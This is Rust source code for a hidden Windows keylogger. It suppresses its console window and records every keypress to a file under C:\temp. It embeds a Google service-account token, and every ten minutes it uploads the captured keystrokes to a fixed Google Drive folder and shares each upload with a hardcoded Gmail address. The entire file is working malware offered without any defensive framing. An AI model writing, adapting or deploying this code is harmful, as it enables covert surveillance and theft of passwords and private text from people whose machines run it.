#![windows_subsystem = "windows"]
use rdev::{listen, Event, EventType};
use tokio::runtime::Runtime;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::Path;
use std::thread::{self, sleep};
use std::time::{Duration, Instant};
use google_drive3::{hyper, hyper_rustls, DriveHub};

pub const TOKEN: &str = include_str!("token.json");

fn callback(event: Event) {
    if let EventType::KeyPress(key) = event.event_type {
        let file_path = "C:\\temp\\klogs.txt";
        let mut file = match OpenOptions::new()
        .append(true)
        .write(true)    // Allow writing
        .create(true)   // Create if not
        .open(file_path)
        {
            Ok(f) => f,
            Err(e) => {
                match fs::File::open("C:\\temp\\logs.txt"){
                    Ok(mut log) => {
                        let _ = log.write_all(e.to_string().as_bytes());
                    },
                    Err(_) => ()
                };
                return;
            }
        };
        let _ = file.write_all(format!("{:?}\n", key).as_bytes());
    }
}

#[tokio::main]
async fn main() {

    let folder_path = "C:\\temp"; // Change this to your desired folder path

    // Check if the directory exists, and create it if it doesn't
    if !Path::new(folder_path).exists() {
        match fs::create_dir_all(folder_path) {
            Ok(_) => println!("Folder created successfully."),
            Err(e) => println!("Failed to create folder: {:?}", e),
        }
    }

    let _ = fs::File::create("C:\\temp\\logs.txt");

    if !Path::new("C:\\temp\\noti-911d4-bc6dbf535d55.json").exists(){
        match fs::write("C:\\temp\\noti-911d4-bc6dbf535d55.json", TOKEN.to_string()) { 
            Ok(_) => (),
            Err(e) => eprintln!("Failed to create file: {}", e),
        }
    }

    thread::spawn(move || {
        if let Err(error) = listen(callback) {
            println!("Error: {:?}", error);
        }
    });

    std::thread::spawn(move || {

        let rt = match Runtime::new(){
            Ok(rt) => rt,
            Err(_) => return 
        };

        rt.block_on(async move {
            loop {
                let start_time = Instant::now();
        
                let duration = Duration::new(600, 0);
                let elapsed = start_time.elapsed();
                if elapsed < duration {
                    sleep(duration - elapsed);
                }
        
                let source = "C:\\temp\\klogs.txt";
                let destination = "C:\\temp\\copy.txt";
                match fs::copy(source, destination){
                    Ok(_) => (),
                    Err(_) => continue
                };
        
                match upload_file().await{
                    Ok(()) => (),
                    Err(_) => ()
                }
            }
        })
    });

    // let hwnd = unsafe { winapi::um::winuser::GetActiveWindow() };
    // if hwnd.is_null() {
    //     eprintln!("Failed to get console window handle");
    //     return;
    // }
    // unsafe {
    //     winapi::um::winuser::ShowWindow(hwnd, winapi::um::winuser::SW_MINIMIZE);
    // }

    loop {
        match fs::File::open("C:\\temp\\logs.txt"){
            Ok(mut log) => {
                let _ = log.write_all(chrono::Utc::now().timestamp_millis().to_string().as_bytes());
            },
            Err(_) => ()
        };
        thread::sleep(Duration::from_secs(10));
    }
    // if let Err(error) = listen(callback) {
    //     println!("Error: {:?}", error);
    // }
}

async fn upload_file() -> Result<(), Box<dyn std::error::Error>>{

    //let a = oauth2::read_service_account_key("C:\\temp\\noti-911d4-bc6dbf535d55.json").await?;
    let a = google_drive3::oauth2::read_service_account_key("C:\\temp\\noti-911d4-bc6dbf535d55.json").await?;
    let aut = google_drive3::oauth2::authenticator::ServiceAccountAuthenticator::builder(a).build().await?;

    // Create Drive API client
    let hub = DriveHub::new(hyper::Client::builder().build(hyper_rustls::HttpsConnectorBuilder::new().with_native_roots()?.https_or_http().enable_http1().build()), aut);

    // File to upload
    let file_path = "C:\\temp\\copy.txt"; // Path to your file
    let file_name = chrono::Local::now().to_string(); // The name you want for the uploaded file

    match fs::metadata("C:\\temp\\klogs.txt"){
        Ok(meta) => {
            if meta.len() == 0 {
                return Ok(());
            }
        },
        Err(_) => {
            return Ok(());
        }
    }

    match fs::File::create("C:\\temp\\klogs.txt"){
        Ok(_) => (),
        Err(_) => return Ok(())
    }

    // Prepare the file metadata
    let file_metadata = google_drive3::api::File {
        name: Some(file_name.to_string()),
        parents: Some(vec!["1mAxYXUhw0xd9VUepVGM87CP86tcriS_j".to_string()]),
        ..Default::default()
    };

    // Read the file content
    let file = OpenOptions::new().write(true).read(true).open(file_path)?;

    // Upload the file
    let (_, result) = hub.files().create(file_metadata).upload(file, mime::TEXT_PLAIN).await?;

    // Get the file ID and link
    let file_id = match result.id{
        Some(v) => v,
        None => return Err(Box::new(std::io::Error::new(std::io::ErrorKind::InvalidData, "")))
    };

    // Set permissions
    let user_permission = google_drive3::api::Permission {
        role: Some("reader".to_string()),
        type_: Some("user".to_string()),
        email_address: Some("boynhabecp@gmail.com".to_string()), // Replace with your email
        ..Default::default()
    };

    hub.permissions().create(user_permission, &file_id)
        .doit().await?;

    Ok(())
}
